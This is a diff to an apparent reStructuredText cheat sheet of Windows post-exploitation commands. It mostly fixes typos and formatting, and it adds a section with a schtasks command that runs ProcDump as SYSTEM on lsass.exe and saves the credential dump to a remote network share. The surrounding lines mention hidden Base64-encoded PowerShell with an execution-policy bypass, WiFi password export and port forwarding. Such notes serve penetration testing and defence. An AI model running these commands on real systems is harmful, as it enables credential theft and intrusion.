@@ -127,7 +127,7 @@ Run PowerShell code endoded as UTF-16LE+Base64:
     # -nop for -NoProfile : do not load the PowerShell profile
     # -sta for -Sta : start using a single-threaded apartment
     # -noni for -NonInteractive : does not present an interactive prompt
-    # -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hiden PowerShell window
+    # -w 1 or -w hidden or -win Hidden for -WindowStyle Hidden : hidden PowerShell window
     # -enc for -EncodedCommand : execute the command encoded in base64
     # -ep bypass or -exec bypass for -ExecutionPolicy bypass : set the default execution
     #       policy for the current session and saves it in $env:PSExecutionPolicyPreference
@@ -162,7 +162,9 @@ Export WiFi profiles (username and password) to ``%APPDATA%\<profile>.xml``::
 
 Source: https://securelist.com/shedding-skin-turlas-fresh-faces/88069/
 
-In PowerShell, without writing any file::
+In PowerShell, without writing any file:
+
+.. code-block:: sh
 
     $results = (netsh wlan show profiles) |
         Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
@@ -313,6 +315,26 @@ A third way of running scripts on a system consists in using Immediate Scheduled
 * Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks
 
 
+Scheduled tasks
+---------------
+
+In order to create a scheduled task that runs `ProcDump <https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>`_ on ``lsass.exe`` (Local Security Authority Subsystem service process) and uploads the result on a network share at 13:37, `schtasks <https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks>`_ can be used:
+
+.. code-block:: sh
+
+    # /ru user context under which the task runs
+    # /sc schedule frequency
+    # /st start time in HH:mm format (24-hour time)
+    #      Python: (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime("%H:%M")
+    # /tn task name
+    # /tr task to be run
+    schtasks /create /tn "NameOfMyTask" /ru SYSTEM /sc once /st 13:37
+        /tr "\\192.0.2.42\ro\procdump64.exe -accepteula -ma lsass.exe \\192.0.2.42\rw\lsass.dmp"
+
+    # List tasks with their status and next run time
+    schtasks
+
+
 Software information
 --------------------
 
@@ -393,7 +415,8 @@ TCP port forwarding with netsh
 
 ::
 
-    netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.0.2.42 connectport=80 connectaddress=10.13.37.1
+    netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.0.2.42
+        connectport=80 connectaddress=10.13.37.1
 
 
 Network shares
@@ -468,7 +491,8 @@ Alternate Data Streams
 
 Get files with ``Zone.Identifier`` alternate data stream (ADS)::
 
-    Get-ChildItem -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction SilentlyContinue | Select-Object FileName
+    Get-ChildItem -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction SilentlyContinue |
+        Select-Object FileName
 
 Read an ADS::
 
